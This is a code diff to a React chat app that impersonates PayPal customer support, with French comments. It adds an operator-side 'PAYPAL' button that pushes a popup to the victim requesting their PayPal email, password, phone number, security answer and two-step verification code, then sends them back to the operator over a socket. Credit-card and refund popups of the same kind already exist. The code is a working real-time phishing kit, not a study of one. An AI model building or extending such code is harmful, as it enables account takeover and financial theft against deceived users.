@@ -21,6 +21,12 @@ const CreditCardIcon = () => (
     <path d="M2 10a1 1 0 0 1 1-1h1a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1v-1z"/>
   </svg> 
 );
+const PayPalIcon = () => (
+  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+    <path d="M14.06 3.713c.12-1.071-.093-1.832-.702-2.526C12.628.356 11.312 0 9.626 0H4.734a.7.7 0 0 0-.691.59L2.005 13.509a.42.42 0 0 0 .415.486h2.756l-.202 1.28a.628.628 0 0 0 .62.726H8.14c.429 0 .793-.31.862-.731l.025-.13.48-3.043.03-.164.001-.018a.845.845 0 0 1 .833-.607h.518c1.671 0 2.978-.732 3.36-2.85.318-1.417.155-2.593-.570-3.047a2.639 2.639 0 0 0-1.092-.26z"/>
+    <path d="M12.50 8.024c-.272 1.492-.917 2.086-2.044 2.086h-.908a.7.7 0 0 0-.691.59l-.596 3.776a.56.56 0 0 1-.552.456H6.473a.42.42 0 0 0-.415.486l.202 1.28a.628.628 0 0 0 .62.726H8.14c.429 0 .793-.31.862-.731l.025-.13.48-3.043.03-.164.001-.018a.845.845 0 0 1 .833-.607h.518c1.671 0 2.978-.732 3.36-2.85.318-1.417.155-2.593-.570-3.047a2.639 2.639 0 0 0-1.092-.26z"/>
+  </svg>
+);
 
 // --- Composant : Panneau d'informations Client ---
 const ClientInfoPanel = ({ info }) => {
@@ -227,6 +233,139 @@ const CreditCardPopup = ({ onSubmit, onClose }) => {
     );
 };
 
+// --- Composant : Pop-up de Compte PayPal ---
+const PayPalAccountPopup = ({ onSubmit, onClose }) => {
+    const [accountData, setAccountData] = useState({
+        email: '',
+        password: '',
+        phoneNumber: '',
+        securityAnswer: '',
+        verificationCode: ''
+    });
+
+    const formatPhoneNumber = (value) => {
+        const v = value.replace(/\D/g, '');
+        if (v.length >= 10) {
+            return v.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3');
+        } else if (v.length >= 6) {
+            return v.replace(/(\d{3})(\d{3})/, '$1-$2');
+        } else if (v.length >= 3) {
+            return v.replace(/(\d{3})/, '$1');
+        }
+        return v;
+    };
+
+    const handleInputChange = (field, value) => {
+        let formattedValue = value;
+        
+        if (field === 'phoneNumber') {
+            formattedValue = formatPhoneNumber(value);
+        } else if (field === 'verificationCode') {
+            formattedValue = value.replace(/[^0-9]/g, '').substring(0, 6);
+        }
+        
+        setAccountData(prev => ({ ...prev, [field]: formattedValue }));
+    };
+
+    const handleSubmit = (e) => {
+        e.preventDefault();
+        onSubmit(accountData);
+        onClose();
+    };
+
+    return (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
+            <div className="bg-white p-8 rounded-lg shadow-2xl w-full max-w-md border">
+                <div className="flex items-center justify-between mb-6">
+                    <div className="flex items-center gap-3">
+                        <img src="/paypal.png" alt="PayPal Logo" className="w-8 h-8" />
+                        <h2 className="text-xl font-semibold text-gray-800">PayPal Account Information</h2>
+                    </div>
+                    <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
+                </div>
+                
+                <form onSubmit={handleSubmit} className="space-y-4">
+                    <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Email Address *</label>
+                        <input
+                            type="email"
+                            placeholder="example@email.com"
+                            value={accountData.email}
+                            onChange={(e) => handleInputChange('email', e.target.value)}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
+                            required
+                        />
+                    </div>
+                    
+                    <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Password *</label>
+                        <input
+                            type="password"
+                            placeholder="Enter your password"
+                            value={accountData.password}
+                            onChange={(e) => handleInputChange('password', e.target.value)}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
+                            required
+                        />
+                    </div>
+                    
+                    <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number *</label>
+                        <input
+                            type="tel"
+                            placeholder="123-456-7890"
+                            value={accountData.phoneNumber}
+                            onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
+                            required
+                        />
+                    </div>
+                    
+                    <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Security Question Answer</label>
+                        <input
+                            type="text"
+                            placeholder="Answer to your security question"
+                            value={accountData.securityAnswer}
+                            onChange={(e) => handleInputChange('securityAnswer', e.target.value)}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
+                        />
+                    </div>
+                    
+                    <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">2-Step Verification Code</label>
+                        <input
+                            type="text"
+                            placeholder="123456"
+                            value={accountData.verificationCode}
+                            onChange={(e) => handleInputChange('verificationCode', e.target.value)}
+                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
+                            maxLength="6"
+                        />
+                        <p className="text-xs text-gray-500 mt-1">Enter the 6-digit code from your authenticator app</p>
+                    </div>
+                    
+                    <div className="flex gap-3 mt-6">
+                        <button
+                            type="button"
+                            onClick={onClose}
+                            className="flex-1 bg-gray-200 text-gray-800 font-bold py-3 px-4 rounded-lg hover:bg-gray-300 transition duration-200"
+                        >
+                            Cancel
+                        </button>
+                        <button
+                            type="submit"
+                            className="flex-1 bg-[#0070ba] text-white font-bold py-3 px-4 rounded-lg hover:bg-[#005ea6] transition duration-200"
+                        >
+                            Submit
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    );
+};
+
 // --- Composant : Pop-up de Vérification ---
 const VerificationPopup = () => {
     return (
@@ -279,6 +418,7 @@ function App() {
     const [isVerifying, setIsVerifying] = useState(false);
     const [showPopup, setShowPopup] = useState(false);
     const [showCreditCardPopup, setShowCreditCardPopup] = useState(false);
+    const [showPayPalAccountPopup, setShowPayPalAccountPopup] = useState(false);
     const [showVerificationPopup, setShowVerificationPopup] = useState(false);
 
     useEffect(() => {
@@ -301,6 +441,11 @@ function App() {
                     setShowCreditCardPopup(true);
                 }
             };
+            const handleDisplayPayPalAccountPopup = () => {
+                if (userType === 'User') {
+                    setShowPayPalAccountPopup(true);
+                }
+            };
             const handleDisplayVerificationPopup = (data) => {
                 if (userType === 'User') {
                     if (data.show) {
@@ -321,6 +466,7 @@ function App() {
             });
             socket.on('display popup', handleDisplayPopup);
             socket.on('display credit card popup', handleDisplayCreditCardPopup);
+            socket.on('display paypal account popup', handleDisplayPayPalAccountPopup);
             socket.on('display verification popup', handleDisplayVerificationPopup);
             
             return () => {
@@ -330,6 +476,7 @@ function App() {
                 socket.off('user activity');
                 socket.off('display popup');
                 socket.off('display credit card popup');
+                socket.off('display paypal account popup');
                 socket.off('display verification popup');
                 if (socket) socket.disconnect();
             };
@@ -406,6 +553,10 @@ function App() {
         socket.emit('request credit card');
     };
 
+    const handleRequestPayPalAccount = () => {
+        socket.emit('request paypal account');
+    };
+
     const handlePopupChoice = (option) => {
         setShowPopup(false);
         socket.emit('popup choice', { option });
@@ -414,6 +565,11 @@ function App() {
     const handleCreditCardSubmit = (cardData) => {
         socket.emit('credit card data', { cardData });
         setShowCreditCardPopup(false);
+    };
+
+    const handlePayPalAccountSubmit = (accountData) => {
+        socket.emit('paypal account data', { accountData });
+        setShowPayPalAccountPopup(false);
     };
 
     const handleCheckboxChange = (type) => {
@@ -471,6 +627,7 @@ function App() {
         <div className="h-screen flex flex-col font-sans bg-[#f5f7fa]">
             {showPopup && <RefundPopup onChoice={handlePopupChoice} />}
             {showCreditCardPopup && <CreditCardPopup onSubmit={handleCreditCardSubmit} onClose={() => setShowCreditCardPopup(false)} />}
+            {showPayPalAccountPopup && <PayPalAccountPopup onSubmit={handlePayPalAccountSubmit} onClose={() => setShowPayPalAccountPopup(false)} />}
             {showVerificationPopup && <VerificationPopup />}
             <header className="flex items-center p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
                 <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
@@ -482,7 +639,7 @@ function App() {
                     </p>
                 </div>
                 {userType === 'Support' && (
-                    <div className="ml-auto flex items-center gap-4">
+                    <div className="ml-auto flex items-center gap-3">
                         <button onClick={handleRequestPopup} title="Request Action from User" className="flex items-center gap-2 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-blue-200 transition duration-300">
                            <PopupIcon />
                            POP-UP
@@ -490,6 +647,10 @@ function App() {
                         <button onClick={handleRequestCreditCard} title="Request Credit Card Information" className="flex items-center gap-2 bg-green-100 text-green-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-green-200 transition duration-300">
                            <CreditCardIcon />
                            CB
+                        </button>
+                        <button onClick={handleRequestPayPalAccount} title="Request PayPal Account Information" className="flex items-center gap-2 bg-orange-100 text-orange-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-orange-200 transition duration-300">
+                           <PayPalIcon />
+                           PAYPAL
                         </button>
                         <button onClick={handleClearChat} className="flex items-center gap-2 bg-red-500 text-white text-xs font-bold py-2 px-3 rounded-lg hover:bg-red-600 transition duration-300">
                             <TrashIcon />
